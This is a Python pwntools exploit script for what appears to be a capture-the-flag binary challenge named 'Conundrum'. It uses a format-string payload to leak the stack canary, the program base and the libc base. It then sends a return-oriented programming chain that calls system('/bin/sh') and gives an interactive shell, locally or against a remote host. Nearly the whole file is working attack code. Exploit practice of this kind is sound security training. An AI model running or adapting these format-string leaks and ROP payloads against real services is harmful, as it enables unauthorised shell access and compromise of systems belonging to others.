#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'conundrum_patched')
elf = exe
filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# ➜  Conundrum checksec conundrum_patched 
# [*] '/home/mark/Desktop/BinExp/Challs/Conundrum/conundrum_patched'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'.'
# ➜  Conundrum

def leak():
    payload = '%23$p.%28$p.%29$p'
    io.recvuntil('honestly):')
    io.sendline('2')
    io.recvuntil('pointers:')
    io.sendline(payload)
    leak = io.recvline().split(b'.')
    canary = int(leak[0][1::], 16)
    elf.address = int(leak[1], 16) - (0x56239c600ab0 - 0x56239c600000)
    libc.address = int(leak[2], 16) - (0x7f7238621c87 - 0x7f7238600000)
    info("Canary: %#x", canary)
    info("Elf base: %#x", elf.address)
    info("Libc base: %#x", libc.address)

    return canary

def rop(canary):
    offset = 136
    pop_rdi = elf.address + 0x0000000000000b13 # pop rdi; ret;
    ret = elf.address + 0x00000000000006ee # ret; 

    sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.sym['system']

    payload = flat({
        offset: [
            canary,
            0xdeadbeef,
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    io.sendline('y')
    io.recvuntil('pointers:')
    io.sendline(payload)
    

if __name__ == '__main__':
    io = start()
    libc = ELF("./libc.so.6")

    canary = leak()
    rop(canary)

    io.interactive()
